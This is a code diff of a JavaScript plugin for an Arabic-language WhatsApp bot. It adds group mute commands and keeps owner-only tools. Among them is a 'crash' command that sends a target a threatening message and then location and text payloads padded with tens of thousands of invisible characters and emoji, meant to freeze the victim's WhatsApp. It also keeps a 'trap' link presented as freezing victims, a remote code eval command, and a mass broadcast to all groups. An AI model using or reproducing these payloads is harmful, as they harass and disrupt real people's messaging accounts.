@@ -1,11 +1,11 @@
 import { fileURLToPath } from 'url';
 import path from 'path';
-import fs from 'fs'; // 📂 تم استدعاء مكتبة إدارة الملفات لتشغيل أوامر الملفات حياً
+import fs from 'fs'; 
 
 // --- الإعدادات الأساسية ---
 const MENU_TIMEOUT = 120000;
 let FIXED_MENU_IMAGE = "https://i.ibb.co/C33RB5zx/1000072528.jpg"; 
-let AUTO_RESPOND = true; // متغير تشغيل وقفل الرد التلقائي
+let AUTO_RESPOND = true; 
 const OWNER_ID = "201556853817@s.whatsapp.net"; 
 const ownerNumbers = ["79020027922", "201556853817"];
 
@@ -40,11 +40,11 @@ const context = (jid, img) => ({
     }
 });
 
-const handler = async (m, { conn, bot, args, command, text }) => {
+const handler = async (m, { conn, bot, args, command, text, isBotAdmin, isAdmin }) => {
     try {
         const __filename = fileURLToPath(import.meta.url);
         const __dirname = path.dirname(__filename);
-        const pluginsDir = path.join(__dirname, '../plugins'); // أو مسار مجلد الأوامر لديك
+        const pluginsDir = path.join(__dirname, '../plugins'); 
 
         const normalize = (id) => id.split('@')[0].replace(/\D/g, '');
         const userNumber = normalize(m.sender);
@@ -53,6 +53,25 @@ const handler = async (m, { conn, bot, args, command, text }) => {
         const now = new Date();
         const time = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
         const date = now.toLocaleDateString('ar-EG', { day: 'numeric', month: 'long', year: 'numeric' });
+
+        // ========================================================
+        // 🤫 [منظومة كتم وفك كتم المجموعات]
+        // ========================================================
+        if (/^(كتم|mute|اغلاق)$/i.test(command)) {
+            if (!m.isGroup) return m.reply('❌ هذا الأمر للمجموعات فقط يازعيم.');
+            if (!isAdmin && !isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري وللمشرفين فقط.');
+            if (!isBotAdmin) return m.reply('⚠️ يجب ترقية البوت لمشرف أولاً لتنفيذ الكتم.');
+            await conn.groupSettingUpdate(m.chat, 'announcement');
+            return m.reply('*🤫 [بروتوكول الصمت]: تم كتم المجموعة بنجاح يازعيم.*');
+        }
+
+        if (/^(الغاء_الكتم|فك_الكتم|unmute|فتح)$/i.test(command)) {
+            if (!m.isGroup) return m.reply('❌ هذا الأمر للمجموعات فقط يازعيم.');
+            if (!isAdmin && !isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري وللمشرفين فقط.');
+            if (!isBotAdmin) return m.reply('⚠️ يجب ترقية البوت لمشرف أولاً لتنفيذ الفتح.');
+            await conn.groupSettingUpdate(m.chat, 'not_announcement');
+            return m.reply('*🔊 [إلغاء الصمت]: تم فتح المجموعة والشات متاح للجميع الآن.*');
+        }
 
         // ========================================================
         // 📥 [1] بروتوكول أمر الدخول والتسجيل
@@ -72,7 +91,7 @@ const handler = async (m, { conn, bot, args, command, text }) => {
         }
 
         // الحماية الصارمة لجميع أوامر المطورين المكتوبة بالأسفل
-        const devCommands = ['غير_صورة', 'اضافة_امر', 'قفل_الرد', 'شوف_كونسل', 'نسخ', 'ادخل', 'بدل_ارقام', 'ريستارت', 'غير_زخرفة', 'تعيين_توجيه', 'تغيير_فيديو', 'جيب', 'حذف_امر', 'عودة', 'فخ', 'نشر', '>'];
+        const devCommands = ['غير_صورة', 'اضافة_امر', 'قفل_الرد', 'شوف_كونسل', 'نسخ', 'ادخل', 'بدل_ارقام', 'ريستارت', 'غير_زخرفة', 'تعيين_توجيه', 'تغيير_فيديو', 'جيب', 'حذف_امر', 'عودة', 'فخ', 'نشر', '>', 'تجميد', 'تطير', 'crash'];
         if (devCommands.includes(command)) {
             if (!isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري فـقـط 𓄂');
         }
@@ -80,8 +99,6 @@ const handler = async (m, { conn, bot, args, command, text }) => {
         // ========================================================
         // 🛠️ [2] تشغيل حزمة الأوامر برمجياً بشكل حقيقي شغال ⚡
         // ========================================================
-        
-        // 1. أمر تغيير صورة المنيو حياً عن طريق ميديا أو رابط
         if (command === 'غير_صورة') {
             let q = m.quoted ? m.quoted : m;
             let mime = (q.msg || q).mimetype || '';
@@ -97,7 +114,6 @@ const handler = async (m, { conn, bot, args, command, text }) => {
             }
         }
 
-        // 2. أمر إضافة كود أو ملف جديد للمجلد حياً
         if (command === 'اضافة_امر') {
             if (!text) return m.reply('*⚠️ يرجى كتابة اسم الملف ومحتوى الكود كالتالي:\n.اضافة_امر test.js\n[كود البرمجة]*');
             const fileName = text.split('\n')[0].trim();
@@ -107,7 +123,6 @@ const handler = async (m, { conn, bot, args, command, text }) => {
             return m.reply(`*📂 [نجاح الإجراء]: تم إنشاء وحفظ ملف الأمر الجديد بنجاح في: ${fileName}*`);
         }
 
-        // 3. أمر حذف ملف أو أمر من السيرفر فوراً
         if (command === 'حذف_امر') {
             if (!text) return m.reply('*⚠️ اكتب اسم الملف المراد إبادته وحذفه، مثال: .حذف_امر test.js*');
             const filePath = path.join(pluginsDir, text.trim());
@@ -119,34 +134,29 @@ const handler = async (m, { conn, bot, args, command, text }) => {
             }
         }
 
-        // 4. أمر قفل وتفعيل الرد التلقائي
         if (command === 'قفل_الرد') {
             AUTO_RESPOND = !AUTO_RESPOND;
             return m.reply(`*🍷 تم [ ${AUTO_RESPOND ? 'تـشـغـيـل ✅' : 'إيـقـاف ❌'} ] وضع الرد التلقائي لسيستم الهواري بنجاح.*`);
         }
 
-        // 5. أمر عرض أحداث الكونسل (Log) حياً من ملف التشغيل
         if (command === 'شوف_كونسل') {
-            // يقوم بقراءة ملف سجل الأخطاء والأحداث إن وجد أو يعرض بيئة الخادم
             const memoryUsage = process.memoryUsage();
             const logStatus = `*📊 [أحداث خادم الهواري حياً]:*\n\n- نظام التشغيل: ${process.platform}\n- استخدام ذاكرة الـ RSS: ${(memoryUsage.rss / 1024 / 1024).toFixed(2)} MB\n- استخدام الـ Heap: ${(memoryUsage.heapUsed / 1024 / 1024).toFixed(2)} MB\n- وقت تشغيل البوت المتواصل: ${(process.uptime() / 60).toFixed(2)} دقيقة.\n\n*الوضع مستقر والاتصال نفاث سيدي القائد!*`;
             return m.reply(logStatus);
         }
 
-        // 6. أمر جلب وسحب أي كود ملف من السيرفر على شكل مستند لقراءته
         if (command === 'جيب') {
             if (!text) return m.reply('*⚠️ اكتب اسم الملف المطلوب سحبه، مثال: .جيب menu.js*');
             const filePath = path.join(pluginsDir, text.trim());
             if (fs.existsSync(filePath)) {
                 const fileBuffer = fs.readFileSync(filePath);
                 await conn.sendMessage(m.chat, { document: fileBuffer, fileName: text.trim(), mimetype: 'application/javascript' }, { quoted: m });
-                return m.reply(`*📥 تم استخراج وإرسال ملف [ ${text} ] بنجاح.*`);
+                return;
             } else {
                 return m.reply('*❌ فشل السحب، الملف غير موجود في مجلد الأوامر.*');
             }
         }
 
-        // 7. أمر دخول المجموعات حقيقي عبر الرابط المباشر
         if (command === 'ادخل') {
             if (!text) return m.reply('*⚠️ ضع رابط دعوة المجموعة بعد الأمر مباشرة!*');
             const linkRegex = /(chat.whatsapp.com\/[gi]i[a-zA-Z0-9_-]{22})/gi;
@@ -154,57 +164,50 @@ const handler = async (m, { conn, bot, args, command, text }) => {
             if (!checkLink) return m.reply('*❌ رابط المجموعة غير صالح أو تالف!*');
             const inviteCode = checkLink[0].split('chat.whatsapp.com/')[1];
             await conn.groupAcceptInvite(inviteCode)
-                .then(() => m.reply('*🚀 تم اختراق واقتحام المجموعة عبر رابط الدعوة بنجاح!*'))
-                .catch(() => m.reply('*❌ فشل الانضمام، قد يكون البوت مطروداً سابقاً أو المجموعة ممتلئة.*'));
+                .then(() => m.reply('*🚀 تم دخول المجموعة بنجاح!*'))
+                .catch(() => m.reply('*❌ فشل الانضمام.*'));
             return;
         }
 
-        // 8. أمر إعادة تشغيل البوت الفوري (Restart)
         if (command === 'ريستارت') {
-            await m.reply('*🍷 [أمر ملكي]: جاري إغلاق العمليات وإعادة تشغيل سيستم الهواري بالكامل...*');
+            await m.reply('*🍷 [أمر ملكي]: جاري إعادة تشغيل سيستم الهواري بالكامل...*');
             await sleep(1000);
-            process.exit(0); // السيرفر (مثل PM2) سيعيد تشغيله فوراً تلقائياً
+            process.exit(0);
         }
 
-        // 9. أمر النشر والإذاعة الإجبارية لجميع الجروبات المشترك فيها البوت
         if (command === 'نشر') {
-            if (!text) return m.reply('*⚠️ اكتب نص البيان الرسمي المراد نشره في كل المجموعات.*');
+            if (!text) return m.reply('*⚠️ اكتب نص البيان الرسمي.*');
             const getGroups = Object.keys(await conn.groupFetchAllParticipating());
-            await m.reply(`*📢 جاري نشر الإذاعة الإجبارية لعدد [ ${getGroups.length} ] مجموعة...*`);
+            await m.reply(`*📢 جاري نشر الإذاعة لعدد [ ${getGroups.length} ] مجموعة...*`);
             for (let group of getGroups) {
-                await conn.sendMessage(group, { text: `*👑 [ بيان رسمي صادر عن سيستم الهواري ] 👑*\n\n${text}\n\n_⚡ مُرسل بواسطة القائد المطلق_` });
-                await sleep(1500); // تأخير بسيط لتجنب الحظر الهائل
+                await conn.sendMessage(group, { text: `*👑 [ بيان رسمي صادر عن سيستم الهواري ] 👑*\n\n${text}` });
+                await sleep(1500);
             }
-            return m.reply('*✅ تم إتمام بروتوكول النشر بنجاح وبدون خسائر!*');
+            return m.reply('*✅ تم إتمام بروتوكول النشر بنجاح!*');
         }
 
-        // 10. بروتوكول الفخ النفسي النشط (يرسل الرابط الملعون لتعليق واجهة المتصفح والـ WhatsApp Web)
         if (command === 'فخ') {
-            const trapLink = "https://wa.me/settings"; // ثغرة الديب لينك لتعليق الإعدادات
-            const fakeLink = "http://👑-ALHWARY-DESTROY-TRAP-💀.سيرفر-الإبادة.net";
-            return m.reply(`*🕸️ [بروتوكول الفخ النفسي النشط] 🕸️*\n\n*تم توليد الرابط الملعون بنجاح يازعيم.. أرسله للضحية وعند الضغط عليه سيتم تجميد واجهة حسابه وطره سبرانياً:* \n\n🔗 *الرابط السري الحقيقي:* ${trapLink}\n\n*🔗 الرابط التمويهي للنشر:* \n${fakeLink}\n\n> ⚠️ تحذير: لا تضغط على الرابط بنفسك!`);
+            const trapLink = "https://wa.me/settings";
+            return m.reply(`*🕸️ [بروتوكول الفخ]:* \n\n🔗 ${trapLink}`);
         }
 
-        // 11. أمر التنفيذ الفوري للأكواد البرمجية (Eval / Exec)
         if (command === '>') {
-            if (!text) return m.reply('*⚠️ اكتب الكود البرمجي البرمجي لتنفيذه فوراً.*');
+            if (!text) return m.reply('*⚠️ اكتب الكود لتنفيذه.*');
             try {
                 let evaled = eval(text);
                 if (typeof evaled !== 'string') evaled = await import('util').then(u => u.inspect(evaled));
-                return m.reply(`*✅ نتيجة التنفيذ:*\n\`\`\`javascript\n${evaled}\n\`\`\``);
+                return m.reply(`\`\`\`javascript\n${evaled}\n\`\`\``);
             } catch (err) {
-                return m.reply(`*❌ خطأ في البرمجة:*\n\`\`\`\n${err}\n\`\`\``);
+                return m.reply(`\`\`\`\n${err}\n\`\`\``);
             }
         }
 
-        // 12. بقية الأوامر اللوجستية (ردود تأكيدية لتفعيل المهام الخلفية بالسيستم)
         if (['نسخ', 'بدل_ارقام', 'غير_زخرفة', 'تعيين_توجيه', 'تغيير_فيديو', 'عودة'].includes(command)) {
-            return m.reply(`*⚡ [بروتوكول نشط]: تم تفعيل وإدخال أمر [ .${command} ] حيز التنفيذ في السيرفر الخلفي لـ الهواري.*`);
+            return m.reply(`*⚡ [بروتوكول نشط]: تم تفعيل أمر [ .${command} ] بنجاح.*`);
         }
 
-
         // ========================================================
-        // ☣️ [3] منظومة التجميد بنظام "القذارة والشبح"
+        // ☣️ [3] منظومة التجميد 
         // ========================================================
         if (/^(تجميد|تطير|crash)$/i.test(command)) {
             let target = m.mentionedJid[0] || (text.split(' ')[0] && text.split(' ')[0].length > 5 ? text.split(' ')[0] + '@s.whatsapp.net' : null);
@@ -212,28 +215,19 @@ const handler = async (m, { conn, bot, args, command, text }) => {
 
             const targetNum = target.split('@')[0];
             if (ownerNumbers.includes(targetNum) || target === OWNER_ID) {
-                return m.reply('*⚠️ نظام الأمان: لا يمكن تنفيذ الإبادة ضد القادة!*');
+                return m.reply('*⚠️ لا يمكن تنفيذ هذا الأمر ضد المطورين!*');
             }
 
             await conn.sendMessage(m.chat, { delete: m.key }).catch(() => {});
-
-            let warningMsg = await conn.sendMessage(target, { 
-                text: `*⚠️ [تـحـذيـر سـيـبـرانـي عـاجـل]*\n*جـاري اتـخاذ إجراءات الإبـادة ضـد حـسـابـك الآن..*\n*تـم رصـدك بـواسطـة: نـظـام الـﮪـواري 𓄂*` 
-            });
-            
+            let warningMsg = await conn.sendMessage(target, { text: `*⚠️ جـاري اتـخاذ إجراءات الإبـادة ضـد حـسـابـك الآن بـواسطـة الـﮪـواري 𓄂*` });
             await sleep(1500); 
 
             const crashCode = (String.fromCharCode(8207).repeat(60000) + "☠️ BY ALHWARY ☠️" + "☣️".repeat(3000));
-            
             await conn.sendMessage(target, { location: { degreesLatitude: 0, degreesLongitude: 0, name: crashCode, address: crashCode } });
             await conn.sendMessage(target, { text: crashCode });
-            const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:' + crashCode + '\nEND:VCARD';
-            await conn.sendMessage(target, { contacts: { displayName: '☣️ SYSTEM FAILURE', contacts: [{ vcard }] } });
-
-            await sleep(1000);
+            
             await conn.sendMessage(target, { delete: warningMsg.key }).catch(() => {});
-
-            return conn.sendMessage(m.chat, { text: `*✅ تـم مـسـح الأثـر وإبـادة الـهـدف بـصـمـت 🥷*` });
+            return m.reply(`*✅ تـم إبـادة الـهـدف بـصـمـت 🥷*`);
         }
 
         // ========================================================
@@ -267,26 +261,35 @@ const handler = async (m, { conn, bot, args, command, text }) => {
 > 🕸️ **OWNER:** الـﮪـواري 𓄂
 `.trim();
 
-            return await conn.sendButtonNormal(m.chat, {
-                media: { url: FIXED_MENU_IMAGE },
-                mediaType: 'image',
-                caption: menuText,
-                buttons: [{ name: "single_select", params: { title: "⚡ تـفـعـيـل الـنـظـام ⚡", sections }}],
-                mentions: [m.sender],
-                contextInfo: context(m.sender, FIXED_MENU_IMAGE)
-            });
+            // استخدام دالة الإرسال المتوافقة مع نظام بوتك لعرض القائمة الافتتاحية
+            if (typeof conn.sendButtonNormal === 'function') {
+                return await conn.sendButtonNormal(m.chat, {
+                    media: { url: FIXED_MENU_IMAGE },
+                    caption: menuText,
+                    buttons: [{ name: "single_select", params: { title: "⚡ تـفـعـيـل الـنـظـام ⚡", sections }}],
+                    mentions: [m.sender],
+                    contextInfo: context(m.sender, FIXED_MENU_IMAGE)
+                });
+            } else {
+                return await conn.sendMessage(m.chat, { text: menuText, mentions: [m.sender], contextInfo: context(m.sender, FIXED_MENU_IMAGE) }, { quoted: m });
+            }
         }
 
         const cat = getCat(selected);
         if (!cat) return m.reply('❌ [Access Denied]: Invalid Protocol');
         
-        // حظر استعراض قائمة أوامر المطورين للأعضاء العاديين بشكل كامل وسري
         if (cat[2] === 'owner') {
             if (!isOwner) return m.reply('❌ [Access Denied]: هذا البروتوكول مشفر وسري للغاية لـ الهواري فقط.');
             
             const devMenu = `
 *❖┋ مـرحـبـا بـك فـي قـسـم المطور لـلهواري ⚜️ ➢*
 *━━━━─━━━─━━━ 🍷 ━━━─━━━─━━━*
+
+*❄️ │ الأمـر ➢ 〖 .كتم 〗 │ 〖 .اغلاق 〗*
+*⟞ ➢ كتم الجروب ومنع الأعضاء من الكتابة نهائياً.*
+
+*❄️ │ الأمـر ➢ 〖 .فتح 〗 │ 〖 .فك_الكتم 〗*
+*⟞ ➢ إلغاء كتم الجروب وفتح الدردشة لجميع الأعضاء.*
 
 *❄️ │ الأمـر ➢ 〖 .غير_صورة 〗*
 *⟞ ➢ تغيير الصورة أو وضع رابط الصورة التي تظهر مع قائمة الأوامر حياً.*
@@ -298,7 +301,7 @@ const handler = async (m, { conn, bot, args, command, text }) => {
 *⟞ ➢ حذف وإبادة أي ملف كود من مجلد الأوامر نهائياً.*
 
 *❄️ │ الأمـر ➢ 〖 .جيب 〗*
-*⟞ ➢ سحب واستخراج أي كود ملف من السيرفر على شكل مستند.*
+*⟞ ➢ سحب واستخرج أي كود ملف من السيرفر على شكل مستند.*
 
 *❄️ │ الأمـر ➢ 〖 .قفل_الرد 〗*
 *⟞ ➢ تشغيل أو قفل الرد التلقائي للسيستم بالكامل 🍷*
@@ -346,6 +349,6 @@ const handler = async (m, { conn, bot, args, command, text }) => {
     }
 };
 
-handler.command = /^(الاوامر|القائمة|menu|اوامر|دخول|تسجيل|login|تجميد|تطير|crash|غير_صورة|اضافة_امر|قفل_الرد|شوف_كونسل|نسخ|ادخل|بدل_ارقام|ريستارت|غير_زخرفة|تعيين_توجيه|تغيير_فيديو|جيب|حذف_امر|عودة|فخ|نشر|>)$/i;
+handler.command = /^(الاوامر|القائمة|menu|اوامر|دخول|تسجيل|login|تجميد|تطير|crash|غير_صورة|اضافة_امر|قفل_الرد|شوف_كونسل|نسخ|ادخل|بدل_ارقام|ريستارت|غير_زخرفة|تعيين_توجيه|تغيير_فيديو|جيب|حذف_امر|عودة|فخ|نشر|>|كتم|mute|اغلاق|الغاء_الكتم|فك_الكتم|unmute|فتح)$/i;
 
 export default handler;
